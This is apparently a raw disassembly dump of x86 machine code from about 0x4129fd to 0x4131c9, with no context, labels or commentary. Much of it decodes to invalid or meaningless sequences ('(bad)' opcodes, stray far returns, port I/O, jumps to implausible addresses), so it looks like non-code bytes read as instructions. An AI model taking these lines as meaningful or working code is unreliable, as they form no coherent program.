  4129fd:	add    DWORD PTR [ebp+0x60],0x3d
  412a01:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  412a08:	inc    ebp
  412a09:	dec    DWORD PTR [ebx-0x341ff701]
  412a0f:	test   esi,ecx
  412a11:	dec    DWORD PTR [ebx-0x7f8a3301]
  412a17:	push   eax
  412a18:	add    DWORD PTR [ebp+0x0],eax
  412a1b:	dec    ebx
  412a1d:	or     al,0xce
  412a1f:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  412a26:	into   
  412a27:	add    BYTE PTR [ebx-0x34ff1400],cl
  412a2d:	mov    esi,ecx
  412a2f:	sar    bh,0x45
  412a32:	adc    al,0x8b
  412a34:	clc    
  412a35:	fadd   DWORD PTR [ebp+0x0]
  412a38:	mov    ebp,DWORD PTR [edx+0x8]
  412a3b:	push   edi
  412a3c:	adc    BYTE PTR [eax+0x1],0x83
  412a40:	add    al,al
  412a42:	retf   
  412a43:	mov    ecx,esi
  412a45:	cld    
  412a46:	mov    eax,DWORD PTR [eax+0xcb01cc]
  412a4c:	into   
  412a4d:	add    BYTE PTR [ebx+0x756aec00],cl
  412a53:	jne    0x412a88
  412a55:	inc    DWORD PTR [ebx]
  412a57:	rcl    BYTE PTR [ecx+0x50],1
  412a5a:	push   eax
  412a5b:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  412a61:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  412a68:	sar    bh,0x84
  412a6b:	or     BYTE PTR [ebx],al
  412a6d:	push   eax
  412a6e:	add    BYTE PTR [ebx+0x4532c845],cl
  412a74:	pushf  
  412a75:	xor    edi,eax
  412a77:	pushf  
  412a78:	mov    ah,0x89
  412a7a:	test   eax,ebp
  412a7c:	clc    
  412a7d:	inc    ebp
  412a7e:	inc    ebp
  412a7f:	mov    DWORD PTR [eax+eax*8],esi
  412a82:	sub    al,0x30
  412a84:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  412a8b:	dec    ebp
  412a8c:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a90:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  412a96:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a9a:	or     DWORD PTR [ecx+0x45ff085c],0x0
  412aa1:	shl    DWORD PTR [ebp-0x380064],1
  412aa7:	int3   
  412aa8:	lea    eax,[ebp+0x45fff860]
  412aae:	push   eax
  412aaf:	xor    dh,BYTE PTR [ebp-0x64]
  412ab2:	(bad)  
  412ab3:	(bad)  
  412ab4:	pop    esp
  412ab5:	lods   al,BYTE PTR ds:[esi]
  412ab6:	inc    DWORD PTR [ebp+0x4508f8ff]
  412abc:	mov    edi,DWORD PTR [eax+edx*8]
  412abf:	pushf  
  412ac0:	jo     0x412a89
  412ac2:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  412ac9:	inc    ebp
  412aca:	add    BYTE PTR [esi],bh
  412acc:	push   0x8b809c
  412ad1:	in     al,dx
  412ad2:	inc    ebp
  412ad3:	push   ebp
  412ad4:	mov    esi,DWORD PTR [ebx]
  412ad6:	cld    
  412ad7:	add    eax,DWORD PTR [eax+0xf013b]
  412add:	adc    al,0x0
  412adf:	add    bh,bh
  412ae1:	jmp    0xbe2bfe
  412ae6:	add    BYTE PTR [ebp+0x45],cl
  412ae9:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  412aef:	dec    ebp
  412af0:	push   0x38033
  412af5:	cmp    eax,DWORD PTR [eax]
  412af7:	unpcklps xmm7,xmm0
  412afa:	jne    0x412afc
  412afc:	dec    DWORD PTR [ebx+0x5545cc18]
  412b02:	mov    DWORD PTR [ebx],esi
  412b04:	shl    BYTE PTR [ebx],1
  412b06:	inc    ebp
  412b07:	add    ecx,DWORD PTR [ecx+0x60fc803]
  412b0d:	retf   0x5575
  412b10:	dec    DWORD PTR [ebx-0x5ba17e8]
  412b16:	(bad)  
  412b17:	stc    
  412b18:	in     al,dx
  412b19:	or     al,0x85
  412b1b:	dec    ebp
  412b1c:	clc    
  412b1d:	xor    eax,DWORD PTR [ebp+0x3]
  412b20:	mov    ebp,ecx
  412b22:	rol    BYTE PTR [eax],1
  412b24:	inc    ebp
  412b25:	add    BYTE PTR [eax-0x7747ab3],bh
  412b2b:	clc    
  412b2c:	inc    ebp
  412b2d:	retf   
  412b2e:	mov    edx,ebx
  412b30:	in     al,dx
  412b31:	(bad)  
  412b32:	retf   
  412b33:	into   
  412b34:	into   
  412b35:	scas   eax,DWORD PTR es:[edi]
  412b36:	dec    ebp
  412b37:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  412b3d:	sub    ecx,esi
  412b3f:	cmp    ecx,DWORD PTR [ebp+0x77]
  412b42:	(bad)  
  412b43:	mov    edi,eax
  412b45:	int3   
  412b46:	test   DWORD PTR [ecx-0x74baff08],ecx
  412b4c:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  412b53:	xor    eax,DWORD PTR [ebp+0x4503f803]
  412b59:	(bad)  
  412b5b:	retf   0x559c
  412b5e:	(bad)  
  412b5f:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  412b66:	inc    ebp
  412b67:	add    eax,0xeb9c4d3f
  412b6c:	(bad)  
  412b6d:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  412b73:	xor    ecx,DWORD PTR [ebp+0x33]
  412b76:	mov    eax,DWORD PTR [ebx]
  412b78:	call   0xce50f680
  412b7d:	retf   0x55d1
  412b80:	test   BYTE PTR [ebx-0x5ff17fe],cl
  412b86:	jmp    0x412b81
  412b88:	add    BYTE PTR ds:0xebf44d8b,al
  412b8e:	push   ebp
  412b8f:	mov    ebp,DWORD PTR [ebx]
  412b91:	mov    eax,0x33f8558b
  412b96:	retf   
  412b97:	xor    ecx,esi
  412b99:	add    edx,ecx
  412b9b:	add    eax,DWORD PTR [edx+0xca010f]
  412ba1:	push   ebp
  412ba2:	dec    ebp
  412ba3:	mov    ecx,DWORD PTR [ebx-0x34050718]
  412ba9:	stc    
  412baa:	rol    DWORD PTR ds:0xebce4dd6,cl
  412bb0:	scas   eax,DWORD PTR es:[edi]
  412bb1:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  412bb7:	xor    ebp,DWORD PTR [ebx]
  412bb9:	xor    edi,DWORD PTR [ebx]
  412bbb:	add    esi,DWORD PTR [edi+0x3]
  412bbe:	mov    ecx,DWORD PTR [edi]
  412bc0:	clc    
  412bc1:	retf   0x55cb
  412bc4:	into   
  412bc5:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  412bcc:	test   al,0x4d
  412bce:	push   ebp
  412bcf:	jbe    0x412c04
  412bd1:	mov    esi,DWORD PTR [ebx]
  412bd3:	mov    al,0x3
  412bd5:	push   ebp
  412bd6:	add    esi,DWORD PTR [ebx]
  412bd8:	rdpmc  
  412bda:	retf   0x5503
  412bdd:	add    ecx,DWORD PTR [ebx-0x53517f1]
  412be3:	dec    ebp
  412be4:	stc    
  412be5:	mov    ecx,DWORD PTR [eax]
  412be7:	or     BYTE PTR [ebp+0x4d],cl
  412bea:	jmp    0x1352c7a
  412bef:	dec    ebp
  412bf0:	dec    ebp
  412bf1:	(bad)  
  412bf2:	mov    ebx,esp
  412bf4:	clc    
  412bf5:	test   ebx,ecx
  412bf7:	clc    
  412bf8:	ror    DWORD PTR [ebp-0x2a],cl
  412bfb:	mov    esi,ecx
  412bfd:	lock scas eax,DWORD PTR es:[edi]
  412bff:	inc    ebp
  412c00:	mov    esi,DWORD PTR [ebx]
  412c02:	hlt    
  412c03:	pushf  
  412c04:	jge    0x412b91
  412c06:	sub    ebx,esp
  412c08:	cmp    ecx,ebx
  412c0a:	ja     0x412bda
  412c0c:	mov    ebp,DWORD PTR [eax-0x58]
  412c0f:	dec    ebp
  412c10:	xor    ecx,DWORD PTR [di+0x3]
  412c14:	mov    esp,esp
  412c16:	clc    
  412c17:	push   ebp
  412c18:	retf   
  412c19:	mov    dl,bl
  412c1b:	adc    esi,edx
  412c1d:	jb     0x412bed
  412c1f:	add    BYTE PTR [edi-0xb7474b3],ch
  412c25:	lock jge 0x412bf3
  412c28:	sub    ecx,DWORD PTR [ebp+0x3b]
  412c2b:	mov    esi,DWORD PTR [edi-0x20]
  412c2e:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  412c35:	mov    BYTE PTR [ebx-0x34b20729],cl
  412c3b:	mov    edx,ebx
  412c3d:	lock (bad) 
  412c3f:	ror    esi,cl
  412c41:	push   ebp
  412c42:	scas   eax,DWORD PTR es:[edi]
  412c43:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  412c49:	pushf  
  412c4a:	sub    esi,DWORD PTR [edx]
  412c4c:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  412c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c53:	xor    esp,DWORD PTR [ebx]
  412c55:	add    ecx,DWORD PTR [ebp-0x1c]
  412c58:	mov    edi,DWORD PTR [ebp-0x8]
  412c5b:	mov    bl,cl
  412c5d:	cmp    dl,bl
  412c5f:	jb     0x412c2f
  412c61:	add    dh,dl
  412c63:	dec    ebp
  412c64:	scas   eax,DWORD PTR es:[edi]
  412c65:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  412c6b:	shr    DWORD PTR [ebx],cl
  412c6d:	into   
  412c6e:	cmp    edx,esi
  412c70:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  412c76:	dec    ebp
  412c77:	dec    ebp
  412c78:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  412c7e:	retf   
  412c7f:	xor    edx,esi
  412c81:	add    ecx,esi
  412c83:	imul   ecx,edx
  412c86:	mov    DWORD PTR [ebp+0x8],edx
  412c89:	xor    ecx,DWORD PTR [ebp+0x2b]
  412c8c:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  412c92:	add    esi,DWORD PTR [ebx]
  412c94:	rol    BYTE PTR [ebx],0x45
  412c97:	rdtsc  
  412c99:	xlat   BYTE PTR ds:[ebx]
  412c9a:	pushf  
  412c9b:	jge    0x412c26
  412c9d:	xor    esp,eax
  412c9f:	sub    eax,DWORD PTR [ebp-0x73]
  412ca2:	(bad)  
  412ca3:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  412caa:	dec    ebp
  412cab:	xchg   BYTE PTR [ebx],dh
  412cad:	inc    DWORD PTR [ebx]
  412caf:	(bad)  
  412cb0:	jmp    0x412cff
  412cb2:	mov    ecx,DWORD PTR [ebx-0x34341324]
  412cb8:	dec    ebp
  412cb9:	into   
  412cba:	mov    ebp,DWORD PTR [edi-0x23737420]
  412cc0:	pushf  
  412cc1:	shl    DWORD PTR [edx],cl
  412cc3:	retf   0x5588
  412cc6:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412ccc:	add    eax,DWORD PTR [eax]
  412cce:	in     al,0x4d
  412cd0:	push   ebp
  412cd1:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  412cd7:	fs add ch,cl
  412cda:	dec    ebp
  412cdb:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  412ce1:	dec    ebp
  412ce2:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  412ce8:	jge    0x412cb8
  412cea:	mov    BYTE PTR [edi+0xf723b3a],ch
  412cf0:	add    cl,dh
  412cf2:	dec    ebp
  412cf3:	dec    DWORD PTR [ebx-0x2c032301]
  412cf9:	inc    ebp
  412cfa:	push   ebp
  412cfb:	dec    DWORD PTR [ebx-0x73ff1f34]
  412d01:	lea    ebx,[esp+edx*2+0x508bff32]
  412d08:	mov    ah,0x45
  412d0a:	push   ebp
  412d0b:	mov    esi,DWORD PTR [ebx]
  412d0d:	les    esi,FWORD PTR [ebx]
  412d0f:	add    BYTE PTR [ebx],al
  412d11:	inc    DWORD PTR [ebx]
  412d13:	mov    ecx,DWORD PTR [edi]
  412d15:	cld    
  412d16:	retf   0x4d80
  412d19:	add    DWORD PTR [ecx+0x4d30e400],ecx
  412d1f:	jne    0x412cac
  412d21:	(bad)  
  412d22:	in     al,dx
  412d23:	ror    bl,1
  412d25:	scas   al,BYTE PTR es:[edi]
  412d26:	into   
  412d27:	add    BYTE PTR [edi-0xf2f7475],ch
  412d2d:	not    bl
  412d2f:	adc    al,0xca
  412d31:	inc    ebp
  412d32:	push   ebp
  412d33:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  412d39:	push   0xaf80d6
  412d3e:	mov    eax,DWORD PTR [eax]
  412d40:	fdiv   st(7),st
  412d42:	sti    
  412d43:	sbb    dh,cl
  412d45:	pop    esi
  412d46:	xchg   esp,eax
  412d47:	leave  
  412d48:	pushf  
  412d49:	add    al,0x32
  412d4b:	push   ebp
  412d4c:	cmp    ebp,esp
  412d4e:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  412d52:	dec    DWORD PTR [ecx-0x740f0375]
  412d58:	push   ebp
  412d59:	cld    
  412d5a:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  412d60:	retf   0x558b
  412d63:	clc    
  412d64:	xor    esi,eax
  412d66:	add    esi,DWORD PTR [ebp-0x75]
  412d69:	(bad)  
  412d6a:	hlt    
  412d6b:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  412d72:	mov    DWORD PTR [edx],ecx
  412d74:	hlt    
  412d75:	(bad)  
  412d76:	dec    ebp
  412d77:	add    dh,BYTE PTR [ebx]
  412d79:	leave  
  412d7a:	mov    edx,0xffec8d55
  412d7f:	push   ecx
  412d80:	rol    DWORD PTR [ebp+0x55],1
  412d83:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  412d89:	mov    eax,0xf8030b33
  412d8e:	lar    ecx,di
  412d91:	push   ebp
  412d92:	retf   0x863b
  412d95:	jne    0x412d94
  412d97:	mov    edi,edi
  412d99:	or     BYTE PTR [ebp+0x41],dh
  412d9c:	mov    ebp,esp
  412d9e:	cld    
  412d9f:	inc    eax
  412da0:	mov    al,0x25
  412da2:	add    DWORD PTR [ecx+0x0],eax
  412da5:	in     eax,dx
  412da6:	test   DWORD PTR [ecx-0x1],eax
  412da9:	fdiv   st(7),st
  412dab:	ret    0x8b
  412dae:	cld    
  412daf:	mov    eax,DWORD PTR [eax+0x8d0151]
  412db5:	clc    
  412db6:	xor    BYTE PTR [ebp+0x45],al
  412db9:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  412dbf:	loopne 0x412dc0
  412dc1:	mov    edi,edi
  412dc3:	mov    ecx,eax
  412dc5:	clc    
  412dc6:	jne    0x412d98
  412dc8:	call   0x823ed1
  412dcd:	and    eax,0xc6854575
  412dd2:	je     0x412dd5
  412dd4:	mov    eax,esi
  412dd6:	cld    
  412dd7:	or     DWORD PTR [eax+0x401c9],eax
  412ddd:	push   ebp
  412dde:	add    ah,ch
  412de0:	add    BYTE PTR [ecx+0x6a],dl
  412de3:	inc    ebp
  412de4:	push   esi
  412de5:	mov    DWORD PTR [eax-0x4],edx
  412de8:	pop    edi
  412de9:	mov    ebx,DWORD PTR [ebx-0x4]
  412dec:	ret    0xbe
  412def:	push   es
  412df0:	mov    ecx,DWORD PTR [ecx-0x77274af]
  412df6:	clc    
  412df7:	lock inc ebp
  412df9:	jne    0x412e51
  412dfb:	(bad)  
  412dfc:	jne    0x412e02
  412dfe:	mov    eax,0xf841ba66
  412e03:	fadd   QWORD PTR [esi]
  412e05:	(bad)  
  412e06:	jne    0x412e45
  412e08:	cmp    eax,ebx
  412e0a:	pop    esi
  412e0b:	mov    ecx,DWORD PTR [eax]
  412e0d:	push   ecx
  412e0e:	inc    ecx
  412e0f:	lea    esi,[eax-0x8]
  412e12:	inc    edx
  412e13:	inc    ebp
  412e14:	int    0x8b
  412e16:	inc    edx
  412e17:	cld    
  412e18:	jo     0x412dd9
  412e1a:	inc    ecx
  412e1b:	xchg   edx,esp
  412e1d:	mov    ebx,eax
  412e1f:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  412e25:	or     edi,eax
  412e27:	inc    ebp
  412e28:	inc    ebp
  412e29:	(bad)  
  412e2a:	mov    ecx,DWORD PTR [eax]
  412e2c:	cld    
  412e2d:	(bad)  
  412e2e:	jmp    0x412e31
  412e30:	mov    eax,esi
  412e32:	mov    DWORD PTR ds:0x4f8c98b,eax
  412e38:	rcl    BYTE PTR [esi+0xf],1
  412e3b:	iret   
  412e3c:	inc    ebp
  412e3d:	leave  
  412e3e:	(bad)  
  412e3f:	dec    DWORD PTR [ecx]
  412e41:	mov    eax,esi
  412e43:	mov    eax,DWORD PTR [edi]
  412e45:	mov    dh,0xdd
  412e48:	push   es
  412e49:	nop
  412e4a:	(bad)  
  412e4b:	inc    DWORD PTR [ebx]
  412e4d:	push   esi
  412e4e:	leave  
  412e4f:	iret   
  412e50:	add    al,0x46
  412e52:	push   ebp
  412e53:	jmp    0xff928444
  412e58:	inc    ebp
  412e59:	push   esi
  412e5a:	mov    DWORD PTR [esi-0x4],eax
  412e5d:	in     eax,dx
  412e5e:	push   ebp
  412e5f:	sbb    BYTE PTR [eax+0x7c6daff],bh
  412e65:	add    al,BYTE PTR [edx]
  412e67:	mov    edx,DWORD PTR [ebp-0x17]
  412e6a:	cmp    edi,esi
  412e6c:	jne    0x412e6d
  412e6e:	(bad)  
  412e6f:	push   esi
  412e70:	pop    es
  412e71:	push   ebp
  412e72:	mov    ebp,esp
  412e74:	or     BYTE PTR [ebp+0x41],al
  412e77:	add    edi,esp
  412e79:	sub    BYTE PTR [eax-0x4],al
  412e7c:	int3   
  412e7d:	jne    0x412e41
  412e7f:	add    DWORD PTR [eax],eax
  412e81:	sbb    al,0x8b
  412e83:	mov    edx,DWORD PTR [ecx+0x14]
  412e86:	lea    edx,[edx-0x1ba7508]
  412e8c:	push   esi
  412e8d:	enter  0xd375,0xb8
  412e91:	test   DWORD PTR [esi],0x6ce0750
  412e97:	enter  0xd375,0x3b
  412e9b:	neg    DWORD PTR [esi+0x50]
  412e9e:	or     cl,dl
  412ea0:	inc    edx
  412ea1:	(bad)  
  412ea2:	loope  0x412e90
  412ea4:	(bad)  
  412ea5:	sub    eax,DWORD PTR [ebx]
  412ea7:	inc    eax
  412ea8:	loope  0x412efa
  412eaa:	add    dl,BYTE PTR [eax-0x37]
  412ead:	push   edi
  412eae:	push   ebp
  412eaf:	imul   ah
  412eb1:	adc    DWORD PTR [ecx-0x1],0x45
  412eb5:	add    BYTE PTR [ecx+0x55d3fc00],cl
  412ebb:	lea    edi,[eax-0x7fff4ca]
  412ec1:	mov    eax,0x4550402
  412ec6:	cmp    ebp,ecx
  412ec8:	jne    0x412e75
  412eca:	mov    eax,DWORD PTR ds:0x241e808
  412ed0:	in     eax,dx
  412ed1:	add    BYTE PTR [eax-0x7],al
  412ed4:	out    0x36,eax
  412ed6:	inc    ecx
  412ed7:	aas    
  412ed8:	jmp    0xccf15a
  412edd:	lock mov edi,DWORD PTR [ebp-0x18]
  412ee1:	and    edi,edi
  412ee3:	mov    edi,edi
  412ee5:	call   0xe40f2fc1
  412eea:	push   es
  412eeb:	add    al,ch
  412eed:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  412ef4:	(bad)  
  412ef5:	hlt    
  412ef6:	add    eax,0xffd3e87d
  412efb:	cmp    bh,0x8
  412efe:	(bad)  
  412eff:	fld    DWORD PTR [esi]
  412f01:	out    dx,al
  412f02:	call   0xffa02e0a
  412f07:	cmp    al,0x46
  412f09:	shl    edx,0x8
  412f0c:	(bad)  
  412f0d:	pop    es
  412f0e:	fisttp QWORD PTR [ebp+0xe577eff]
  412f14:	push   ebx
  412f15:	add    BYTE PTR [ebx+0x24008b56],cl
  412f1b:	add    BYTE PTR [ebp+0x50],al
  412f1e:	push   eax
  412f1f:	add    DWORD PTR [ebx+0x757d1834],ecx
  412f25:	sub    edx,DWORD PTR [esi-0x24]
  412f28:	jne    0x412ee0
  412f2a:	lods   eax,DWORD PTR ds:[esi]
  412f2b:	mov    edx,DWORD PTR [edx-0x34]
  412f2e:	dec    esi
  412f2f:	out    0x83,eax
  412f31:	into   
  412f32:	push   edi
  412f34:	loopne 0x412f04
  412f36:	shr    BYTE PTR [edx+ecx*4+0x0],1
  412f3a:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  412f41:	rol    DWORD PTR [edx],0x8
  412f44:	mov    esp,ecx
  412f46:	cmp    DWORD PTR [ebx],0xc
  412f49:	mov    esi,0x5001c0
  412f4e:	push   eax
  412f4f:	push   cs
  412f50:	push   eax
  412f51:	(bad)  
  412f52:	sub    edx,edi
  412f54:	push   esi
  412f55:	adc    al,0xcb
  412f57:	ins    DWORD PTR es:[edi],dx
  412f58:	mov    eax,0x203e8
  412f5d:	add    al,ah
  412f5f:	inc    esi
  412f60:	mov    al,ch
  412f62:	pop    es
  412f63:	add    DWORD PTR [eax],0x1
  412f66:	add    dh,al
  412f68:	add    ah,ch
  412f6a:	rol    DWORD PTR [edx-0xd],1
  412f6d:	cli    
  412f6e:	push   0x4a
  412f70:	pop    ecx
  412f71:	retf   0xfe6
  412f74:	add    BYTE PTR [ebx-0x4e72f41e],al
  412f7a:	(bad)  
  412f7b:	dec    BYTE PTR [ebx+0x45b1fc72]
  412f81:	(bad)  
  412f82:	sub    ebp,DWORD PTR [ebx]
  412f84:	and    al,0x52
  412f86:	(bad)  
  412f87:	dec    edi
  412f88:	inc    ebp
  412f89:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  412f90:	add    BYTE PTR [ebp-0x7b],dh
  412f93:	pop    eax
  412f94:	add    BYTE PTR [edx+0x0],bl
  412f97:	pop    edx
  412f98:	dec    ebp
  412f99:	jmp    DWORD PTR [ebx]
  412f9b:	and    al,0xec
  412f9d:	push   edx
  412f9e:	out    0x64,eax
  412fa0:	jmp    0xd3f325a5
  412fa5:	jmp    0x412fff
  412fa7:	mov    al,0xfe
  412fa9:	dec    BYTE PTR [ebp-0x18fd8018]
  412faf:	add    BYTE PTR [esi+ebp*1],bh
  412fb2:	pop    edx
  412fb3:	icebp  
  412fb4:	mov    eax,cs
  412fb6:	ins    BYTE PTR es:[edi],dx
  412fb7:	adc    eax,0x75510000
  412fbc:	mov    esi,0x70158
  412fc1:	or     DWORD PTR [eax-0x74f48dfe],esi
  412fc7:	mov    edi,esp
  412fc9:	cld    
  412fca:	jge    0x413041
  412fcc:	(bad)  
  412fce:	aas    
  412fcf:	and    al,0x6d
  412fd1:	adc    cl,0x1
  412fd4:	mov    eax,DWORD PTR [eax]
  412fd6:	and    ecx,DWORD PTR [ebx-0x167203fd]
  412fdc:	dec    ebp
  412fdd:	add    eax,ebp
  412fdf:	add    BYTE PTR [edx],al
  412fe1:	fadd   DWORD PTR [eax]
  412fe3:	stc    
  412fe4:	enter  0xee00,0x8b
  412fe8:	sbb    eax,0x1
  412feb:	sbb    esi,ecx
  412fed:	in     al,0x0
  412fef:	in     eax,dx
  412ff0:	add    BYTE PTR [eax],al
  412ff2:	jne    0x412f7f
  412ff4:	cmp    edx,esp
  412ff6:	jb     0x413001
  412ff8:	jmp    0x41306f
  412ffa:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  413000:	add    BYTE PTR [ebx+0x4d83d840],cl
  413006:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  41300c:	jb     0x412f97
  41300e:	pop    edx
  41300f:	fadd   QWORD PTR [ebx-0x7445faa1]
  413015:	or     dh,BYTE PTR [edx+0x0]
  413018:	inc    edx
  413019:	or     dl,bh
  41301b:	xlat   BYTE PTR ds:[ebx]
  41301c:	dec    edx
  41301d:	push   edi
  41301e:	add    al,0x7
  413020:	leave  
  413021:	rol    DWORD PTR [edx+eax*1],0x7
  413025:	add    ecx,ecx
  413027:	mov    edx,ecx
  413029:	int3   
  41302a:	jmp    0x412fea
  41302c:	mov    al,0x0
  41302e:	(bad)  
  41302f:	jne    0x413019
  413031:	mov    eax,DWORD PTR [edx]
  413033:	call   0xc155ad38
  413038:	pop    edi
  413039:	add    ebx,DWORD PTR [ecx-0x37]
  41303c:	pop    ecx
  41303d:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  413044:	push   es
  413045:	mov    eax,DWORD PTR [eax]
  413047:	int3   
  413048:	add    ch,al
  41304a:	jae    0x413034
  41304c:	int    0x1
  41304e:	enter  0x3000,0x18
  413052:	add    BYTE PTR [ebp+0x75],al
  413055:	mov    esi,DWORD PTR [eax-0x171f0134]
  41305b:	push   0x2
  41305d:	pop    ecx
  41305e:	add    BYTE PTR [eax],cl
  413060:	push   ebx
  413061:	lea    edi,[edi+eax*2]
  413064:	mov    al,0x1
  413066:	jb     0x413068
  413068:	mov    al,0x10
  41306a:	push   eax
  41306b:	add    al,0x75
  41306d:	add    BYTE PTR [ebx],ch
  41306f:	add    ebx,esp
  413071:	int3   
  413072:	jne    0x413084
  413074:	movsx  edx,cl
  413077:	add    DWORD PTR [eax],eax
  413079:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  413080:	mov    gs,edi
  413082:	add    BYTE PTR [eax-0x50],ch
  413085:	add    al,ch
  413087:	mov    eax,DWORD PTR [ecx]
  413089:	sub    eax,DWORD PTR [eax]
  41308b:	jb     0x413102
  41308d:	add    DWORD PTR [esp+eiz*8-0x50],esi
  413091:	jge    0x41307b
  413093:	add    al,0x1
  413095:	add    DWORD PTR [eax],0x0
  413098:	jne    0x41309a
  41309a:	je     0x4130e1
  41309c:	mov    eax,DWORD PTR [edi]
  41309e:	ror    BYTE PTR [ebp+0x4d],1
  4130a1:	or     DWORD PTR [ecx+0x4d03d004],0x3
  4130a8:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  4130ae:	mov    DWORD PTR [ebx],ebp
  4130b0:	fadd   DWORD PTR [eax+0x75]
  4130b3:	inc    eax
  4130b4:	pop    eax
  4130b5:	lea    ebx,[ecx+0x4f]
  4130b8:	push   0xb1000003
  4130bd:	out    dx,eax
  4130be:	add    ebp,DWORD PTR [edx+edx*2]
  4130c1:	add    BYTE PTR [ebx+ecx*4],bh
  4130c4:	mov    ch,BYTE PTR [ebx]
  4130c6:	jb     0x41313a
  4130c8:	add    al,0x89
  4130ca:	push   eax
  4130cb:	call   0x84297e3d
  4130d0:	add    DWORD PTR [eax+eax*1],eax
  4130d3:	jae    0x4130e9
  4130d5:	icebp  
  4130d6:	inc    ebp
  4130d7:	mov    eax,DWORD PTR gs:[ecx]
  4130da:	int3   
  4130db:	out    dx,al
  4130dc:	loopne 0x41312b
  4130de:	sub    eax,DWORD PTR [edx]
  4130e0:	push   0xffffff83
  4130e2:	pop    esi
  4130e3:	push   cs
  4130e4:	jl     0x4130ff
  4130e6:	add    al,0xaf
  4130e8:	xor    eax,0x832b6d00
  4130ed:	mov    eax,DWORD PTR [edx]
  4130ef:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4130f5:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4130fb:	inc    ebp
  4130fc:	shr    ebx,0x3
  4130ff:	or     DWORD PTR [eax],0x4
  413102:	push   0xffffffa5
  413104:	pop    esi
  413105:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  41310c:	jmp    0x41316b
  41310e:	mov    edi,0xff0272
  413113:	fdivr  QWORD PTR [ebp+0x5d]
  413116:	push   0x4e
  413118:	pop    ecx
  413119:	call   0x41751e
  41311e:	mov    DWORD PTR [ebx],eax
  413120:	in     al,0xc8
  413122:	rol    BYTE PTR [ebp-0x75],0xc1
  413126:	call   0xab3307
  41312b:	pop    esi
  41312c:	enter  0xceff,0x8b
  413130:	repz mov ecx,DWORD PTR [ebp-0x34]
  413134:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  41313b:	je     0x41313d
  41313d:	or     DWORD PTR [ebx-0x74183b24],eax
  413143:	jne    0x413129
  413145:	jmp    0x413140
  413147:	push   DWORD PTR [edx-0x24]
  41314a:	push   0x4d
  41314c:	pop    ecx
  41314d:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  413151:	jge    0x413159
  413153:	mov    eax,eax
  413155:	sub    ebp,DWORD PTR [edx+0x24]
  413158:	pop    esi
  413159:	inc    ebp
  41315a:	mov    esp,0x8b6077
  41315f:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  413165:	lods   al,BYTE PTR ds:[esi]
  413166:	add    BYTE PTR [ebx],bh
  413168:	enter  0xce73,0x49
  41316c:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  413174:	stc    
  413175:	jge    0x4131e9
  413177:	jnp    0xdd40b4d8
  41317d:	call   0xc43253
  413182:	fadd   st(0),st
  413184:	dec    esi
  413185:	ins    BYTE PTR es:[edi],dx
  413186:	stc    
  413187:	cmp    al,0x73
  413189:	push   ebp
  41318a:	mov    eax,0xf8028b
  41318f:	jne    0x413152
  413191:	mov    esi,ecx
  413193:	mov    esp,DWORD PTR [ebp+0x2c]
  413196:	add    edi,DWORD PTR [ebp-0x24]
  413199:	sub    esp,eax
  41319b:	and    al,0x45
  41319d:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4131a3:	sbb    al,0xee
  4131a5:	pop    esi
  4131a6:	call   0x8131d6
  4131ab:	fsubr  st,st(3)
  4131ad:	sti    
  4131ae:	add    BYTE PTR gs:[ecx],bh
  4131b1:	add    eax,esp
  4131b3:	add    DWORD PTR [esi],eax
  4131b5:	rol    DWORD PTR [ebp+0x8],0x29
  4131b9:	mov    esp,eax
  4131bb:	clc    
  4131bc:	jne    0x413233
  4131be:	mov    eax,0x8b0673
  4131c3:	loopne 0x41320a
  4131c5:	loopne 0x413150
  4131c7:	lods   al,BYTE PTR ds:[esi]
  4131c8:	int3   
  4131c9:	inc    ebp
